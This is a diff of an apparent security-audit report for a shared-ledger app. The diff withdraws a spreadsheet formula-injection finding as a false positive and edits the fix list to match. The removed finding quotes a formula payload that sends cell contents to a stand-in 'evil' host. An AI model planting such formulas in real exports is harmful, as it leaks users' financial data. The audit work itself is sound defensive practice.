@@ -23,7 +23,7 @@ What remains weak is a **cluster of money-integrity + authz-correctness gaps** p
 | Sev | Count |
 |-----|-------|
 | Critical | 0 |
-| High | 7 |
+| High | 6 | *(H5 withdrawn on verification — see §3)* |
 | Medium | 15 |
 | Low / Info | ~12 |
 
@@ -54,8 +54,8 @@ These are about the repo's *own* quality bar, not runtime behavior.
 ### H4 — "Log out everywhere" is silently dead for the bootstrap owner *(BOTH audits — A + B#1)*
 `db/access.ts:171` (`virtualBootstrapOwner`) hardcodes `sessionsInvalidBefore: null`. `POST /api/logout` and `revokeAccessUser` write the revocation epoch (`access.ts:697`), and `getSession` checks it (`routes/auth.ts:155`), but allowlisted owners resolve through the virtual path (`access.ts:294`) and bypass the DB row. **Impact:** a stolen owner session cookie stays valid the full 7-day window regardless of logout. Members are unaffected. **Fix:** read the real `sessions_invalid_before` for bootstrap owners (the row exists after login upsert).
 
-### H5 — CSV/Excel formula injection in xlsx export *(Audit A)*
-`export/xlsx.ts:54-65` (+ summary/merchant/tag sheets) writes `merchant`, `description`, `tags` verbatim via `tx.addRow(...)` — no formula-prefix neutralization. `=HYPERLINK("http://evil/?x="&A1,"click")` in a description becomes a live formula on open. **Impact:** in a shared ledger this is a **member→owner** vector (owner opens an export containing the spouse's rows). **Fix:** prefix any cell value matching `^[=+\-@\t\r]` with `'`.
+### H5 — ~~CSV/Excel formula injection in xlsx export~~ **WITHDRAWN — false positive (verified 2026-06-19)**
+Original claim: `export/xlsx.ts` writes `merchant`/`description`/`tags` verbatim, so `=HYPERLINK(...)` becomes a live formula on open. **This is wrong for the XLSX path.** Empirical probe: ExcelJS stores a `=`-prefixed string as cell **type 3 (String)**, not type 6 (Formula); Excel/LibreOffice render string-typed cells as literal text and do **not** evaluate them. Formula injection is a *CSV* vector (untyped), and there is **no CSV export** in the app — the only `text/csv` emitter, `uploadExport()` (`storage/index.ts:65`), has **zero callers** (dead code). Prepending `'` to an already-string-typed cell would render a *visible* spurious quote, corrupting the data with no safety gain. **No fix applied.** (Minor: delete the dead `uploadExport` — see L-tier.)
 
 ### H6 — Statement/card PII sent to MiniMax unredacted *(Audit A; resolved by DECIDE D3)*
 `statement/redact.ts` only sanitizes *error strings*; `statement/parser.ts:60-71` sends the full statement text (account numbers, card numbers, holder name/address) verbatim to the LLM. The `understand_image` vision path likewise sends the full receipt image. **→ See D3 for the resolved response (disclosure, not redaction).**
@@ -116,7 +116,7 @@ Each ran advocate + challenger + supervisor (shipping-biased). All three landed 
 3. Owner revocation reads the real epoch (H4).
 4. Non-manager `paid_by_user_id` must be self (H2).
 5. Receipt attach: ownership-check first, `415` on bad MIME, cleanup blob on DB-miss (M1).
-6. xlsx formula-escape (H5).
+   *(H5 xlsx-escape removed — withdrawn as a false positive on verification.)*
 
 **PR 2 — the resolved design decisions (D1/D2/D3):**
 7. D2 query changes — `ignored` out of live aggregates, `confirmed_total_cents` into the close (P1/P2).
